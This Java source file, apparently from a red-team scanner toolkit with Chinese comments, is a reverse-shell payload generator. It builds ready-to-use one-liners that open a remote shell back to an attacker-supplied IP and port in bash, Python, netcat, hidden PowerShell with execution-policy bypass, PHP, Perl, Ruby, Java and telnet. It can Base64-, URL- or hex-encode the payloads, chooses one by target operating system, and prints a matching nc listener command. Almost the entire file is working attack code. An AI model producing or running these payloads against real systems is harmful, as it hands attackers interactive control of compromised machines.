package com.potato.potatotool.content.redTeam.vulnScanner.http;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.Base64;

/**
 * 反弹Shell Payload生成器
 * 
 * 支持多种类型的反弹Shell Payload：
 * - Bash
 * - Python
 * - Netcat (nc)
 * - PowerShell
 * - PHP
 * - Perl
 * - Ruby
 * - Java
 * 
 * @author Potato
 * @date 2025-11-01
 */
public class ReverseShellGenerator {

    /**
     * Shell类型枚举
     */
    public enum ShellType {
        BASH("bash"),
        PYTHON("python"),
        NC("nc"),
        POWERSHELL("powershell"),
        PHP("php"),
        PERL("perl"),
        RUBY("ruby"),
        JAVA("java"),
        TELNET("telnet");
        
        private final String name;
        
        ShellType(String name) {
            this.name = name;
        }
        
        public String getName() {
            return name;
        }
    }
    
    /**
     * 编码类型枚举
     */
    public enum EncodingType {
        NONE,       // 无编码
        BASE64,     // Base64编码
        URL,        // URL编码
        HEX         // 十六进制编码
    }

    /**
     * 生成反弹Shell Payload
     * 
     * @param ip 回连IP地址
     * @param port 回连端口
     * @param type Shell类型
     * @return Shell Payload字符串
     */
    public static String generate(String ip, int port, ShellType type) {
        return generate(ip, port, type, EncodingType.NONE);
    }

    /**
     * 生成反弹Shell Payload（带编码）
     * 
     * @param ip 回连IP地址
     * @param port 回连端口
     * @param type Shell类型
     * @param encoding 编码类型
     * @return Shell Payload字符串
     */
    public static String generate(String ip, int port, ShellType type, EncodingType encoding) {
        if (ip == null || ip.isEmpty()) {
            throw new IllegalArgumentException("IP地址不能为空");
        }
        if (port <= 0 || port > 65535) {
            throw new IllegalArgumentException("端口号必须在1-65535之间");
        }

        String payload = generateRawPayload(ip, port, type);
        return encodePayload(payload, encoding);
    }

    /**
     * 生成原始Payload（未编码）
     */
    private static String generateRawPayload(String ip, int port, ShellType type) {
        switch (type) {
            case BASH:
                return generateBashPayload(ip, port);
            case PYTHON:
                return generatePythonPayload(ip, port);
            case NC:
                return generateNcPayload(ip, port);
            case POWERSHELL:
                return generatePowerShellPayload(ip, port);
            case PHP:
                return generatePhpPayload(ip, port);
            case PERL:
                return generatePerlPayload(ip, port);
            case RUBY:
                return generateRubyPayload(ip, port);
            case JAVA:
                return generateJavaPayload(ip, port);
            case TELNET:
                return generateTelnetPayload(ip, port);
            default:
                return generateBashPayload(ip, port);
        }
    }

    /**
     * 编码Payload
     */
    private static String encodePayload(String payload, EncodingType encoding) {
        switch (encoding) {
            case BASE64:
                return Base64.getEncoder().encodeToString(payload.getBytes());
            case URL:
                try {
                    return URLEncoder.encode(payload, "UTF-8");
                } catch (UnsupportedEncodingException e) {
                    return payload;
                }
            case HEX:
                return toHexString(payload);
            case NONE:
            default:
                return payload;
        }
    }

    // ==================== Shell Payload生成方法 ====================

    /**
     * 生成Bash反弹Shell
     */
    private static String generateBashPayload(String ip, int port) {
        // 多种Bash反弹Shell方式，优先使用最兼容的
        return String.format("bash -i >& /dev/tcp/%s/%d 0>&1", ip, port);
    }

    /**
     * 生成备用Bash Payload（exec方式）
     */
    public static String generateBashExecPayload(String ip, int port) {
        return String.format("0<&196;exec 196<>/dev/tcp/%s/%d; sh <&196 >&196 2>&196", ip, port);
    }

    /**
     * 生成Bash Payload（sh方式）
     */
    public static String generateBashShPayload(String ip, int port) {
        return String.format("sh -i >& /dev/tcp/%s/%d 0>&1", ip, port);
    }

    /**
     * 生成Python反弹Shell
     */
    private static String generatePythonPayload(String ip, int port) {
        return String.format(
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" +
            "s.connect((\"%s\",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);" +
            "p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            ip, port
        );
    }

    /**
     * 生成Python3反弹Shell（紧凑版）
     */
    public static String generatePython3Payload(String ip, int port) {
        return String.format(
            "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"%s\",%d));" +
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
            ip, port
        );
    }

    /**
     * 生成Netcat反弹Shell
     */
    private static String generateNcPayload(String ip, int port) {
        // nc -e 方式（传统nc）
        return String.format("nc -e /bin/sh %s %d", ip, port);
    }

    /**
     * 生成Netcat反弹Shell（无-e参数版本）
     */
    public static String generateNcNoePayload(String ip, int port) {
        // 适用于不支持-e参数的nc版本
        return String.format("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f", ip, port);
    }

    /**
     * 生成PowerShell反弹Shell
     */
    private static String generatePowerShellPayload(String ip, int port) {
        return String.format(
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);" +
            "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)" +
            "{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
            "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);" +
            "$stream.Flush()};$client.Close()\"",
            ip, port
        );
    }

    /**
     * 生成PowerShell简化版
     */
    public static String generatePowerShellSimplePayload(String ip, int port) {
        return String.format(
            "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);" +
            "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};" +
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
            "$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);" +
            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            ip, port
        );
    }

    /**
     * 生成PHP反弹Shell
     */
    private static String generatePhpPayload(String ip, int port) {
        return String.format(
            "php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            ip, port
        );
    }

    /**
     * 生成PHP反弹Shell（exec方式）
     */
    public static String generatePhpExecPayload(String ip, int port) {
        return String.format(
            "<?php $sock=fsockopen(\"%s\",%d);$proc=proc_open(\"/bin/sh -i\", " +
            "array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>",
            ip, port
        );
    }

    /**
     * 生成Perl反弹Shell
     */
    private static String generatePerlPayload(String ip, int port) {
        return String.format(
            "perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" +
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");" +
            "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            ip, port
        );
    }

    /**
     * 生成Ruby反弹Shell
     */
    private static String generateRubyPayload(String ip, int port) {
        return String.format(
            "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'",
            ip, port
        );
    }

    /**
     * 生成Java反弹Shell
     */
    private static String generateJavaPayload(String ip, int port) {
        return String.format(
            "r = Runtime.getRuntime();" +
            "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);" +
            "p.waitFor();",
            ip, port
        );
    }

    /**
     * 生成Telnet反弹Shell
     */
    private static String generateTelnetPayload(String ip, int port) {
        return String.format(
            "TF=$(mktemp -u);mkfifo $TF && telnet %s %d 0<$TF | /bin/sh 1>$TF",
            ip, port
        );
    }

    // ==================== 辅助方法 ====================

    /**
     * 转换为十六进制字符串
     */
    private static String toHexString(String str) {
        StringBuilder hex = new StringBuilder();
        for (char c : str.toCharArray()) {
            hex.append(String.format("\\x%02x", (int) c));
        }
        return hex.toString();
    }

    /**
     * 生成所有类型的Payload（用于测试或选择）
     */
    public static void printAllPayloads(String ip, int port) {
        System.out.println("反弹Shell Payload生成器");
        System.out.println("目标: " + ip + ":" + port);
        System.out.println();
        
        for (ShellType type : ShellType.values()) {
            System.out.println("=== " + type.getName() + " ===");
            System.out.println(generate(ip, port, type));
            System.out.println();
        }
    }

    /**
     * 获取推荐的Shell类型（根据操作系统）
     */
    public static ShellType getRecommendedType(String os) {
        if (os == null || os.isEmpty()) {
            return ShellType.BASH;
        }
        
        String osLower = os.toLowerCase();
        if (osLower.contains("windows")) {
            return ShellType.POWERSHELL;
        } else if (osLower.contains("linux") || osLower.contains("unix")) {
            return ShellType.BASH;
        } else {
            return ShellType.BASH;
        }
    }

    /**
     * 生成监听器启动命令
     */
    public static String generateListenerCommand(int port) {
        return String.format("nc -lvnp %d", port);
    }
}


















